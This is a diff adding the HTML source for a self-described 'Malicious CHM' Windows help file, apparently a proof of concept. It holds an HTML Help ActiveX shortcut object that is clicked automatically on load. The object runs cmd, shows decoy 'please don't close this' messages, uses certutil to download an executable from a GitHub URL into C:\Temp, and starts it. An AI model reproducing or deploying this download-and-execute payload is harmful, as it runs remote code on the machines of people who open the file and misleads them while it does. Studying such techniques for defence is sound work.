@@ -1,0 +1,23 @@
+<html>
+<title> Malicious CHM </title>
+<head>
+</head>
+<body>
+
+<h2 align=center> Malicious CHM </h2>
+<p>
+<h3 align=center> This is a malicious CHM file </h3>
+</p>
+</body>
+</html>
+
+<OBJECT id=shortcut classid="clsid:52a2aaae-085d-4187-97ea-8c30db990436" width=1 height=1>
+<PARAM name="Command" value="ShortCut">
+<PARAM name="Button" value="Bitmap:shortcut">
+<PARAM name="Item1" value=",cmd,/c echo HTML Help Executable may be stopped working... & echo Process is running, please don't close this... & certutil.exe -urlcache -split -f https://github.com/void010/dummy/raw/main/cp_poc.exe c:\Temp\cp_poc.exe & start c:\Temp\cp_poc.exe">
+<PARAM name="Item2" value="273,1,1">
+
+</OBJECT>
+<SCRIPT>
+shortcut.Click();
+</SCRIPT>
